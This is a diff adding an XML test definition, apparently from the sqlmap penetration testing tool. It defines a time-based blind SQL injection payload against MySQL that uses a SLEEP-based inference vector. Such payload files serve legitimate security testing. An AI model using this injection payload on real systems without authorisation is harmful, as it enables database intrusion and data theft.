@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Time-based boolean tests -->
+
+    <!-- Prefering "query SLEEP" over "SLEEP" because of JOIN-alike cases where SLEEPs get called multiple times (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1) -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
+</root>
